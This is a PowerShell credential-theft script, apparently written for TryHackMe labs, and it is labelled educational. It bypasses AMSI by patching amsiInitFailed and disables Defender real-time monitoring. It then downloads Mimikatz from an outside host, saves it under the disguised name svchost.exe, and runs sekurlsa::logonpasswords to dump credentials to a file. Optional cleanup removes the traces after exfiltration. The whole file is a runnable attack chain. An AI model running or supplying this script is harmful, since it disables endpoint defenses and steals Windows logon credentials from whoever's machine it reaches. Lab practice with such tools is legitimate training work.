# TryHackMe Educational Script - Mimikatz Credential Extraction
# For educational use ONLY in authorized TryHackMe environments

function Bypass-AMSI {
    Write-Output "[*] Attempting AMSI bypass..."
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $b = $a.GetField('amsiInitFailed','NonPublic,Static')
        $b.SetValue($null,$true)
        Write-Output "[+] AMSI Bypass successful"
    } catch {
        Write-Output "[-] AMSI Bypass failed: $_"
    }
}

function Disable-Defender {
    Write-Output "[*] Attempting to disable real-time monitoring..."
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        $status = Get-MpComputerStatus
        if ($status.RealTimeProtectionEnabled -eq $false) {
            Write-Output "[+] Successfully disabled real-time protection"
        } else {
            Write-Output "[-] Failed to disable real-time protection"
        }
    } catch {
        Write-Output "[-] Error: $_"
    }
}

function Download-Mimikatz {
    $outputPath = "$env:TEMP\svchost.exe"
    $url = "http://192.168.129.133/mimikatz.exe"
    
    Write-Output "[*] Downloading from $url to $outputPath..."
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
        $webClient.DownloadFile($url, $outputPath)
        
        if (Test-Path $outputPath) {
            Write-Output "[+] Download successful, file size: $((Get-Item $outputPath).Length) bytes"
            return $true
        } else {
            Write-Output "[-] Download failed - file not found"
            return $false
        }
    } catch {
        Write-Output "[-] Download error: $_"
        return $false
    }
}

function Execute-Mimikatz {
    $filePath = "$env:TEMP\svchost.exe"
    
    if (!(Test-Path $filePath)) {
        Write-Output "[-] Mimikatz not found at $filePath"
        return
    }
    
    Write-Output "[*] Attempting to execute Mimikatz..."
    
    try {
        # Execute and capture output
        $output = & $filePath "privilege::debug" "sekurlsa::logonpasswords" "exit" | Out-String
        
        # Display the output
        Write-Output "[+] Mimikatz output:"
        Write-Output $output
        
        # Save to a file for later analysis
        $output | Out-File "$env:TEMP\mimikatz_results.txt"
        Write-Output "[+] Results saved to $env:TEMP\mimikatz_results.txt"
    } catch {
        Write-Output "[-] Execution error: $_"
    }
}

function Cleanup-Files {
    $filePath = "$env:TEMP\svchost.exe"
    $resultsPath = "$env:TEMP\mimikatz_results.txt"
    
    Write-Output "[*] Cleaning up files..."
    
    try {
        if (Test-Path $filePath) {
            Remove-Item -Path $filePath -Force
            if (!(Test-Path $filePath)) {
                Write-Output "[+] Successfully removed $filePath"
            } else {
                Write-Output "[-] Failed to remove $filePath"
            }
        }
        
        # Optionally remove results file after exfiltration
        # Uncomment if you want to remove the results file
        <#
        if (Test-Path $resultsPath) {
            Remove-Item -Path $resultsPath -Force
            if (!(Test-Path $resultsPath)) {
                Write-Output "[+] Successfully removed $resultsPath"
            } else {
                Write-Output "[-] Failed to remove $resultsPath"
            }
        }
        #>
    } catch {
        Write-Output "[-] Cleanup error: $_"
    }
}

function Test-AdminPrivileges {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Output "[+] Running with administrative privileges"
        return $true
    } else {
        Write-Output "[-] Not running as administrator - some techniques may fail"
        return $false
    }
}

function Test-DefenderStatus {
    try {
        $defenderStatus = Get-MpComputerStatus
        Write-Output "[*] Defender Status:"
        Write-Output "    RealTimeProtectionEnabled: $($defenderStatus.RealTimeProtectionEnabled)"
        Write-Output "    IoavProtectionEnabled: $($defenderStatus.IoavProtectionEnabled)"
        Write-Output "    AntispywareEnabled: $($defenderStatus.AntispywareEnabled)"
    } catch {
        Write-Output "[-] Error checking Defender status: $_"
    }
}

# Main function to orchestrate the credential extraction
function Extract-Credentials {
    Write-Output "==============================================="
    Write-Output "   Windows Credential Extraction Tool          "
    Write-Output "==============================================="
    
    # Step 1: Check for admin rights
    $isAdmin = Test-AdminPrivileges
    
    # Step 2: Check defender status
    Test-DefenderStatus
    
    # Step 3: Perform security bypasses
    Bypass-AMSI
    if ($isAdmin) {
        Disable-Defender
    }
    
    # Step 4: Download tool
    $downloadSuccess = Download-Mimikatz
    
    # Step 5: Execute and extract credentials
    if ($downloadSuccess) {
        Execute-Mimikatz
    } else {
        Write-Output "[-] Download failed - cannot proceed with credential extraction"
    }
    
    # Step 6: Clean up (optional)
    # Uncomment the line below if you want to remove files after execution
    # Cleanup-Files
    
    Write-Output "==============================================="
    Write-Output "   Credential Extraction Complete              "
    Write-Output "==============================================="
}

# Run the credential extraction
Extract-Credentials